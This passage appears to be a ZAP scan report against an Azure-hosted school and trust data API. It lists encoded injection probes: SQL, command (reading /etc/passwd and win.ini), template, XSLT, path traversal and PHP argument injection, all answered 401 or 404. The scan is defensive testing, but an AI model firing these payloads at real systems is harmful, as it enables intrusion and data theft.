  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2526sleep+15.0%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2526timeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2526sleep+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%253Bsleep+15.0%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bget-help+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bsleep+15.0%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%253Bstart-sleep+-s+15.0+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+%252F+sleep%252815%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+AND+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+AND+1%253D2+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+OR+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=WEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=WEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=www.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=www.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=www.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=ZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zApPX2sS
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%2523%257B9392*2059%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%2523set%2528%2524x%253D4692*9607%2529%2524%257Bx%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%2524%257B4086*4592%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%253C%2525%253D8140*5718%2525%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%253Cp+th%253Atext%253D%2522%2524%257B9514*7069%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%25233710*3284%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%25409033*6973%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%2540math+key%253D%25229824%2522+method%253D%2522multiply%2522+operand%253D%25227105%2522%252F%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%257B%253D5575*1396%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%257B4998*3252%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%257B84690%257Cadd%253A22830%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B%257Bprint+%25229814%2522+%25221193%2522%257D%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj%257B3778*7583%257Dzj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=zj+2157*1669+zj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/swagger.json
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/swagger.json%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%252Bresponse.write%2528901%252C150*121%252C831%2529%252B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
